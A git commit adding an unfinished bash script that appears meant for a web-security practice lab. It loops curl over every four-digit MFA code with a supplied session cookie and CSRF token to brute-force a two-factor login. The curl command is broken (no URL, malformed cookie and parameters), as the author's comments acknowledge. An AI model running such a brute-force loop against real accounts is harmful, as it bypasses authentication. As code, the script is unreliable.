8232df55eadb9eff055299ff633435317f8c556a
Etum <catsarebestthing@outlook.com>
2020-09-19 23:01:05 +0200

    Create curl4burp.sh

---
+++ Tests/curl4burp.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+#Unfinished, uploading here so i can work on it later
+#This is for a lab/labs where PSW brute is too slow
+echo 'enter the URL: '
+read url
+echo 'enter the cookie session: '
+read cookie
+echo 'enter the csrf token: '
+read csrf
+for num in {0000..9999}; do
+curl -A 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -b session=$cookie;csrf=$csrf&mfa-code=$num >
+#url not specified. maybe -b does not work with multiple cookies? Write cookies into file and use -c cookies.txt
+done
+
